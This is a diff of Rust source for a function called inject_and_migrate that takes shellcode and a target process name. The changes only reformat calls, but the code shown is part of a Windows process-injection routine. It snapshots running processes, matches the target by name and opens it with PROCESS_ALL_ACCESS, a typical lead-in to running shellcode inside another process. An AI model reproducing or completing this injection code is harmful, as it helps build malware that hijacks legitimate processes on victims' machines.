@@ -26,11 +26,7 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
     // Call CreateToolhelp32Snapshot to get a snapshot of all the processes currently running
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/ToolHelp/fn.CreateToolhelp32Snapshot.html
-    let snapshot = unsafe { 
-        match CreateToolhelp32Snapshot(
-            TH32CS_SNAPPROCESS,
-            0_u32
-        ) {
+    let snapshot = unsafe { match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0_u32) {
             Ok(value) => value,
             Err(_) => panic!("Could not obtain handle to snapshot")
         }
@@ -44,11 +40,7 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
         dwSize: mem::size_of::<PROCESSENTRY32>() as u32,
         ..Default::default()
     };
-    while unsafe {
-        Process32Next(
-            snapshot,
-            &mut process_entry).as_bool()
-        } {
+    while unsafe { Process32Next(snapshot, &mut process_entry).as_bool() } {
         let mut process_name = String::from("");
         for element in process_entry.szExeFile {
             let element_as_u8 = unsafe { mem::transmute::<CHAR, u8>(element) };
@@ -69,12 +61,7 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
     // Call OpenProcess to get a handle to the target process via its PID
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.OpenProcess.html
-    let explorer_handle = unsafe { 
-        match OpenProcess(
-            PROCESS_ALL_ACCESS, 
-            false,
-            pid
-        ) {
+    let explorer_handle = unsafe { match OpenProcess(PROCESS_ALL_ACCESS, false, pid) {
             Ok(value) => value,
             Err(_) => panic!("Could not open a handle to the process")
         }
